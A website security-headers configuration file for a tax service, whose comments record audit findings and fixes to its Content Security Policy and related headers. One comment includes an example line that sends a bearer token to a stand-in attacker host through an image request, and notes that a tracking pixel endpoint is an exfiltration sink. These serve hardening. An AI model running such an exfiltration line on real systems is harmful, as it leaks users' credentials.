customHeaders:
  - pattern: '**/*'
    headers:
      # ── Prevent MIME sniffing ─────────────────────────────────────────────
      - key: X-Content-Type-Options
        value: nosniff

      # ── Block clickjacking ────────────────────────────────────────────────
      - key: X-Frame-Options
        value: DENY

      # ── Don't leak full URLs to third-party services ──────────────────────
      - key: Referrer-Policy
        value: strict-origin-when-cross-origin

      # ── Disable unused browser APIs ───────────────────────────────────────
      - key: Permissions-Policy
        value: camera=(), microphone=(), geolocation=(), payment=()

      # ── Force HTTPS for 1 year (browser-level enforcement) ───────────────
      - key: Strict-Transport-Security
        value: max-age=31536000; includeSubDomains

      # ── Content Security Policy ───────────────────────────────────────────
      # Allows: Stripe (payments), Vimeo (landing video), Google Fonts,
      # Mailchimp (newsletter), app.taxstat360.com (backend API), and the Meta
      # (Facebook) advertising pixel.
      #
      # AUDIT M8 (second launch audit, Sep 2026) — three changes:
      #
      #   1. img-src was `'self' data: https: blob:`. The bare `https:` permitted ANY
      #      https host, which is an open exfiltration channel for any script that does
      #      manage to execute: `new Image().src = 'https://attacker/' + token` needs no
      #      fetch and no CORS. That is the exfil half of H5, whose bearer token is
      #      readable from JS. A repo-wide scan found NO <img src="https://..."> anywhere
      #      — the external hosts in the codebase (irs.gov, engineeredtaxservices.com,
      #      repsrecord.com) are anchor hrefs, not images — so the only external image
      #      needed is the Meta pixel's beacon at www.facebook.com/tr.
      #
      #   2. Five connect-src hosts removed: quickbooks.api.intuit.com, api.xero.com,
      #      api.wave.com, api.freshbooks.com and api.web3forms.com. Provider OAuth moved
      #      server-side and the web3forms key moved behind POST /alerts/form-relay (see
      #      integrations.js, OBS-5 RESOLVED). Zero references remain to any of the five
      #      in src/ or index.html. Each was a permitted destination bought for nothing.
      #
      #   3. frame-ancestors 'none' added — it was absent entirely. X-Frame-Options: DENY
      #      above covers legacy browsers; frame-ancestors is the CSP-era equivalent and
      #      is what modern browsers actually honour.
      #
      # NOT done here, deliberately: violation reporting. The finding attributes the
      # September CSP outage to its absence, but reporting would not have caught that —
      # a dropped header produces no violations to report, because there is no policy.
      # What catches absence is asserting the LIVE response (H13). Reporting is still
      # worth adding, and needs a backend endpoint to receive the reports; it is an
      # owner decision, not a config edit.
      #
      # FIX (fresh-pass audit, Aug 2026): the Meta Pixel (index.html's deferred,
      # consent-gated loader -- see pixelConsent.test.js) loads
      # https://connect.facebook.net/en_US/fbevents.js and reports events to
      # https://www.facebook.com/tr -- neither domain was listed here, a real
      # gap between this source file and the site's actual, intended behavior
      # (the pixel is a deliberate, disclosed, consent-gated feature per
      # Privacy.jsx, not something that should've needed an undocumented
      # allowance). Listed explicitly below rather than relying on img-src's
      # broad `https:` catch-all, since the pixel's script tag and its
      # tracking beacon are governed by script-src/connect-src, not img-src.
      #
      # FIX (fresh-pass audit, Aug 2026, finding M-7): 'unsafe-inline' and
      # 'unsafe-eval' dropped from script-src. A repo-wide scan found zero use
      # of dangerouslySetInnerHTML, innerHTML, or eval() anywhere in the
      # codebase, so unsafe-eval was pure unused risk. The one genuinely
      # inline script (the pixel loader above, in index.html) is a static,
      # unchanging block, so a nonce (which needs a server to mint one per
      # request -- not available on this static CloudFront/S3 site) isn't the
      # right tool; a SHA-256 hash of that exact script's content is the
      # standard replacement for a static site and is listed below instead.
      # MAINTENANCE NOTE: if the inline pixel-loader script in index.html
      # (the block containing `window.__ts360LoadPixel = function`) is EVER
      # edited -- even whitespace -- this hash must be recomputed or the
      # pixel will silently stop loading (CSP blocks it, no console error
      # beyond a CSP violation report). Recompute with:
      #   node -e "const fs=require('fs');const html=fs.readFileSync('index.html','utf8');const m='window.__ts360LoadPixel = function';const i=html.indexOf(m);const s=html.lastIndexOf('<script>',i)+8;const e=html.indexOf('</script>',i);const c=html.slice(s,e);console.log('sha256-'+require('crypto').createHash('sha256').update(c,'utf8').digest('base64'))"
      #
      # IMPORTANT: Test first by temporarily changing the key above to:
      #   Content-Security-Policy-Report-Only
      # Check the browser console for any violations, fix them, then switch
      # back to the enforcing header name below.
      # ⚠ INDENTATION IS LOAD-BEARING (found live, Sep 2026): every line of this
      # folded block (>-) must sit at the SAME indent. In YAML, a line indented
      # MORE than the block's first line is kept literally and its newline is
      # PRESERVED. The connect-src URLs used to be extra-indented, so this value
      # carried 12 raw newlines — and an HTTP header value cannot contain them,
      # so CloudFront dropped the header entirely. The site served NO CSP in
      # production while every other header here was applied normally, and the
      # unit test passed because it only read this file, never the live response.
      # src/customHttp.csp.test.js asserts this: it parses the folded block, fails
      # if ANY continuation line is indented differently from the first, checks the
      # assembled value carries no newline and still lists all 12 directives, and
      # applies the same indent check to every other `>-` block in this file.
      # (Audit H12, Sep 2026: that guard was described here before it existed. It
      # was written and verified by re-introducing the original over-indentation and
      # confirming the suite goes red — a guard that only passes proves nothing.)
      # FRESH-EYES F-16 (11 Sep 2026): connect.facebook.net removed from connect-src. That
      # host SERVES the pixel script (script-src, kept); it is not an event destination.
      # www.facebook.com stays in img-src and connect-src because the pixel beacon goes
      # there — and be clear about what that means: the pixel endpoint accepts arbitrary
      # query data, so it remains a usable exfiltration sink for an injected script. M8
      # narrowed `https:` to one host, which is real hardening, but it is not closure.
      # Closing it means gating the pixel behind consent at the policy level or dropping
      # it. Recorded here so the residual is a decision, not an oversight.
      - key: Content-Security-Policy
        value: >-
          default-src 'self';
          script-src 'self' 'sha256-+Ls5J8NpLnwIUxzK4UCD1XQL3KuCQA5AeIFOO5iGoLk=' https://js.stripe.com https://connect.facebook.net;
          style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
          font-src 'self' https://fonts.gstatic.com;
          img-src 'self' data: blob: https://www.facebook.com;
          connect-src 'self'
          https://app.taxstat360.com
          wss://app.taxstat360.com
          https://api.stripe.com
          https://taxstat360.us4.list-manage.com
          https://www.facebook.com;
          frame-src https://js.stripe.com https://hooks.stripe.com https://player.vimeo.com;
          worker-src 'self' blob:;
          frame-ancestors 'none';
          object-src 'none';
          base-uri 'self';
          form-action 'self' https://app.taxstat360.com https://taxstat360.us4.list-manage.com;
          upgrade-insecure-requests;

  # ── AUDIT H13 (second launch audit, Sep 2026): CONSOLIDATED FROM amplify.yml ──
  #
  # These three cache rules used to live in a SECOND customHeaders block in
  # amplify.yml, which also redefined the '**/*' pattern with
  # X-Frame-Options: SAMEORIGIN — directly contradicting the DENY above — and with
  # no CSP and no HSTS at all. Two files defining headers for the same pattern is
  # how a security header set silently becomes whichever file the platform happens
  # to prefer. Everything now lives here; amplify.yml no longer sets headers.
  - pattern: '/index.html'
    headers:
      - key: Cache-Control
        value: 'no-cache, no-store, must-revalidate'
      - key: Pragma
        value: 'no-cache'
      - key: Expires
        value: '0'

  - pattern: '/assets/**'
    headers:
      - key: Cache-Control
        value: 'public, max-age=31536000, immutable'
